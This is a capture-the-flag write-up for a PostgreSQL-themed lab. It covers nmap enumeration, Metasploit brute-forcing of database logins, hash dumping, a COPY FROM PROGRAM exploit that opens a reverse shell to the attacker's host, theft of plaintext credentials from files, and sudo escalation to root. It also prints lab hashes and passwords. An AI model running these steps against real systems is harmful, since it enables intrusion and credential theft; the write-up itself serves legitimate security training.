
## 1. What is the rdbms installed on the server?

1. We start off with a basic nmap scan to view all the open ports and service name + version running on these ports 
```
┌──(kali㉿kali)-[~/Documents/labs/poster]
└─$ nmap -sV -sC -o nmap.txt 10.113.141.153
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 09:08 +0200
Nmap scan report for 10.113.141.153
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.95 seconds
                                                        

```

2. This guys us the first answer being `Postgresql`

## 2. What port is the rdbms running on?

1. This answer can also be obtained via an nmap scan, where the RDBMS is running on port `5432`


## 3. After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

1. For this task we start our Metasploit console with the `msfconsole -q` command to start it in quiet mode for quicker boot up time.
2. The task mentions we need to use an "auxiliary" module and the hint before this tasks mentions how MSF contains modules to enumerate multiple RDBMS types. So we search in our MSFCLI with `search type:auxiliary name: postgresql` and from the options below, we know the module we are looking for is the `auxiliary/scanner/postgres/postgres_login` one as the hints have pointed us towards this direction

```
msf > search type:auxiliary name:postgresql

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  auxiliary/server/capture/postgresql                        .                normal  No     Authentication Capture: PostgreSQL
   1  auxiliary/scanner/postgres/postgres_dbname_flag_injection  .                normal  No     PostgreSQL Database Name Command Line Flag Injection
   2  auxiliary/scanner/postgres/postgres_login                  .                normal  No     PostgreSQL Login Utility
   3  auxiliary/admin/postgres/postgres_readfile                 .                normal  No     PostgreSQL Server Generic Query
   4  auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
   5  auxiliary/scanner/postgres/postgres_version                .                normal  No     PostgreSQL Version Probe

```


## 4. What are the credentials you found?

1. So this task points us towards setting up and using the module on the lab to find login credentials for our target.
2. To setup the module I did the following steps in order directly after our search from the previous task:
	1. `use 2` to select the login module
	2. `show options` to see what info the module requires to run against our targetr
	3. `set RHOSTS TARGET_IP` to target the victim 
	4. `set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` to change our password list, I just chose the default Metasploit list
	5. `set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt` to set our username list
	6. All other options are already automatically filled in for us correctly already so just enter `run` to start the module and keep not it may take a while depending on the wordlists you choose.
	7. from our results we got a hit on `postgres:password`, it may show "password@postgres...." but ignore everything after the @.

## 5. What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?


1. So looking back at our search query results for task 3, I couldn't definitely see at first glance which module this question was referring too. So I reran the search command and ran `info  auxiliary/MODULE_NAME` on each module to find out exactly what each module did. This resulted in me determining that `auxiliary/admin/postgres/postgres_sql` was the module which this task is referring to as it allows you to execute authenticated commands on a target

## 6. Based on the results of #6, what is the rdbms version installed on the server?


1. So to setup the module we just type `use auxiliary/admin/postgres/postgres_sql` and the following to run it and find the answers of this task: 
	1. `show options`
	2. `set RHOSTS TARGET_IP`
	3. `set PASSWORD password`
	4. and finally `run` as the default query selects the DB's version which is what this task is asking us to do
2. We get the answer of `9.5.21`


## 7. What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

1. So initially I thought we could find this module in our previous but that was not the case.
2. To find this module I simply typed the search query of `search type:auxiliary name:hash` to find all hash dumping relating modules. This resulting in me finding the `auxiliary/scanner/postgres/postgres_hashdump`, which is the correct module the lab is referring to.

## 8. How many user hashes does the module dump?

1. To use this module I simply typed `use 11` and `show options` to setup the necessary values to run it against our target as so:
	1. `set RHOSTS TARGET_IP` to target our victim
	2. `set PASSWORD password` to correlate with our target's credentials
	3. `run` and we get the output below where our answer is `6` for this task

```
msf auxiliary(scanner/postgres/postgres_hashdump) > run
[+] 10.113.141.153:5432 - Query appears to have run successfully
[+] 10.113.141.153:5432 - Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] 10.113.141.153:5432 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


## 9. What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?


1. So looking back at our first MSF search query the module this is referring to can very clearly be identified by its name as `auxiliary/admin/postgres/postgres_readfile` which is the answer to this question

## 10. What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

1. So we change our search query to `search type:exploit name:postgresql` to narrow down our search results and help us determine which module this task is referring to.
2. Based on the output below we were able to identify that the module to execute commands is option `0` or `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` as the answer format for this task

```
msf auxiliary(scanner/postgres/postgres_hashdump) > search type:exploit name:postgresql

Matching Modules
================
   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1     \_ target: Automatic                                      .                .          .      .
   2     \_ target: Unix/OSX/Linux                                 .                .          .      .
   3     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   4     \_ target: Windows (CMD)                                  .                .          .      .
   5   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   6   exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   7     \_ target: Linux x86                                      .                .          .      .
   8     \_ target: Linux x86_64                                   .                .          .      .
   9   exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   10    \_ target: Windows x86                                    .                .          .      .
   11    \_ target: Windows x64                                    . 
```

## 11. Compromise the machine and locate user.txt

1. To complete this task we use the module from the previous task with the `use 0` command and the `show options` to view what is required from us to exploit the target, where the following options was set:
	1. `set RHOSTS TARGET_IP`
	2. `set PASSWORD password`
	3. `set LHOST tun0` to establish a connection to our THM VPN IP address and get shell on target
	4. `exploit` to run the exploit and get shell
```
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > exploit
[*] Started reverse TCP handler on 192.168.144.74:4444 
[*] 10.113.141.153:5432 - 10.113.141.153:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.113.141.153:5432 - Exploiting...
[+] 10.113.141.153:5432 - 10.113.141.153:5432 - kqykSwFbAnh dropped successfully
[+] 10.113.141.153:5432 - 10.113.141.153:5432 - kqykSwFbAnh created successfully
[+] 10.113.141.153:5432 - 10.113.141.153:5432 - kqykSwFbAnh copied successfully(valid syntax/command)
[+] 10.113.141.153:5432 - 10.113.141.153:5432 - kqykSwFbAnh dropped successfully(Cleaned)
[*] 10.113.141.153:5432 - Exploit Succeeded
[*] Command shell session 1 opened (LHOST:4444 -> 10.113.141.153:37786) at 2026-03-05 10:17:01 +0200

```

2. As seen in the above output, we spawn a non-interactive shell so I decided to background it with `ctr + z` and `y` and than upgrade it to a meterpreter shell with the `sessions -u 1` command
3. We can now interactive with the server using meterpreter by typing `sessions 2` to open the meterpreter session.
4. In this shell we navigate to the `/` directory and list out the `home` directory to find  the `dark` and `alison` directory where `alison` seems to have the user.txt file we are looking for
5. Trying to cat out this file directly fails as we don't have the correct permissions so we need to try navigate a way to obtain the flag from this file.
6. Looking back at the `dark` directory we find a file called `credentials.txt`, which we can cat out! Reading this file gives us the credentials to login as the dark user as seen in the following output 
```
postgres@ubuntu:/home$ cat dark/credentials.txt
cat dark/credentials.txt
dark:qwerty1234#!hackme
```

7. With these credentials we can now ssh into the server with `ssh dark@TARGER_IP` and inputted the password from credentials.txt into the password field.
8. This still doesn't give us Alisson's permissions though but, its nicer to have an stable SSH shell to use to continue our search. Given the lab is about databases I thought the credentials for Alison might be found someone in the `var/www/html` directory as this is common place to store web and service information on Linux servers.
9. Navigating to this directory we find the `config.php` file and `poster` directory, but I know the config.php file normally contains sensitive user information so I catted it out and got Alison's creds!
```
dark@ubuntu:/var/www/html$ cat config.php 
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
```

10.  Now simple `su alison`, input the password and navigate to `/home/alison` to cat out the `user.txt` and get the flag for this task.

## 12. Escalate privileges and obtain root.txt

1. So running our first privilege escalation check of `sudo -l` to view commands Alison can run as root, we see Alison can run `ALL` commands without a password
```
alison@ubuntu:~$ sudo -l
[sudo] password for alison: 
Sorry, try again.
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

2. This is great as you just have to simply type `sudo su` to change from Alison to root without a password and navigate to the `/root` directory and cat out the flag there to complete the lab. 